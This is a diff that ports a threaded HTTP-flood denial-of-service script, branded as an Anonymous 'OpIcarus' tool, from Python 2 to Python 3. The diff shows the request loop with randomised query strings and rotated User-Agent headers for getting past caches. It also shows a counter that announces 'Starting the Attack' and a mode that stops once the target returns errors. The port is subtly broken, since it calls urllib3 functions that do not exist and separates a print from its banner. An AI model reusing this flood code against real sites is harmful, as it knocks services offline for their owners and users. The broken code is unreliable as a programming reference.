@@ -1,4 +1,4 @@
-import urllib2
+import urllib3
 import sys
 import threading
 import random
@@ -144,7 +144,7 @@ def useragent_list():
 	headers_useragents.append('Balihoo/Nutch-1.0-dev (Crawler for Balihoo.com search engine - obeys robots.txt and robots meta tags ; http://balihoo.com/index.aspx; robot at balihoo dot com)')
 	headers_useragents.append('BanBots/1.2 (spider@banbots.com)')
 	headers_useragents.append('Barca/2.0.xxxx')
-        headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
+	headers_useragents.append('(DreamPassport/3.0; isao/MyDiGiRabi)')
 	headers_useragents.append('(Privoxy/1.0)')
 	headers_useragents.append('*/Nutch-0.9-dev')
 	headers_useragents.append('+SitiDi.net/SitiDiBot/1.0 (+Have Good Day)')
@@ -185,7 +185,7 @@ def useragent_list():
 	headers_useragents.append('Adaxas Spider (http://www.adaxas.net/)')
 	headers_useragents.append('Advanced Browser (http://www.avantbrowser.com)')
 	headers_useragents.append('AESOP_com_SpiderMan')
-        headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
+	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.3 (KHTML, like Gecko) BlackHawk/1.0.195.0 Chrome/127.0.0.1 Safari/62439616.534')
 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
 	headers_useragents.append('Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)')
 	headers_useragents.append('Mozilla/5.0 (PlayStation 4 1.52) AppleWebKit/536.26 (KHTML, like Gecko)')
@@ -823,10 +823,10 @@ def buildblock(size):
 	return(out_str)
 
 def usage():
-	print 'DeepFuck =Url='
-	print "\a"
-print \
-"""                        .
+	print ('DeepFuck =Url=')
+	print ("\a")
+print
+("""                        .
              ,----------------,              ,---------,
         ,-----------------------,          ,"        ,"|
       ,"                      ,"|        ,"        ,"  |
@@ -845,8 +845,8 @@ print \
  / ==ooooooooooooooo==.o.  ooo= //   ,`\--{)B     ,"
 /_==__==========__==_ooo__ooo=_/'   /___________,"
 This is Anonymous: OpIcarus has started!
-"""
-print '---------------------------------------------------'
+""")
+print( '---------------------------------------------------')
 
 	
 #http request
@@ -858,7 +858,7 @@ def httpcall(url):
 		param_joiner="&"
 	else:
 		param_joiner="?"
-	request = urllib2.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
+	request = urllib3.Request(url + param_joiner + buildblock(random.randint(3,10)) + '=' + buildblock(random.randint(3,10)))
 	request.add_header('User-Agent', random.choice(headers_useragents))
 	request.add_header('Cache-Control', 'no-cache')
 	request.add_header('Accept-Charset', 'ISO-8859-1,utf-8;q=0.7,*;q=0.7')
@@ -867,18 +867,18 @@ def httpcall(url):
 	request.add_header('Connection', 'keep-alive')
 	request.add_header('Host',host)
 	try:
-			urllib2.urlopen(request)
-	except urllib2.HTTPError, e:
-			#print e.code
+			urllib3.urlopen(request)
+	except urllib3.HTTPError as e:
+			print(e.code)
 			set_flag(1)
- 			print '[+] ~> We are Anonymous - ExpectUS  <~ [+]'
+			print('[+] ~> We are Anonymous - ExpectUS  <~ [+]')
 			code=500
-	except urllib2.URLError, e:
-			#print e.reason
+	except urllib3.URLError as e:
+			print(e.reason)
 			sys.exit()
 	else:
 			inc_counter()
-			urllib2.urlopen(request)
+			urllib3.urlopen(request)
 	return(code)		
 
 	
@@ -890,7 +890,7 @@ class HTTPThread(threading.Thread):
 				code=httpcall(url)
 				if (code==500) & (safe==1):
 					set_flag(2)
-		except Exception, ex:
+		except Exception as ex:
 			pass
 
 # monitors http threads and counts requests
@@ -898,11 +898,11 @@ class MonitorThread(threading.Thread):
 	def run(self):
 		previous=request_counter
 		while flag==0:
-			if (previous+100<request_counter) & (previous<>request_counter):
-				print "%d (= Starting the Attack =}" % (request_counter)
+			if (previous+100<request_counter) & (previous!=request_counter):
+				print(f"{request_counter} (= Starting the Attack =)")
 				previous=request_counter
 		if flag==2:
-			print "\n -fall and not get up"
+			print ("\n -fall and not get up")
 
 #execute 
 if len(sys.argv) < 2:
@@ -913,7 +913,7 @@ else:
 		usage()
 		sys.exit()
 	else:
-		print "Copyright: Anonymous"
+		print ("Copyright: Anonymous")
 		if len(sys.argv)== 3:
 			if sys.argv[2]=="safe":
 				set_safe()
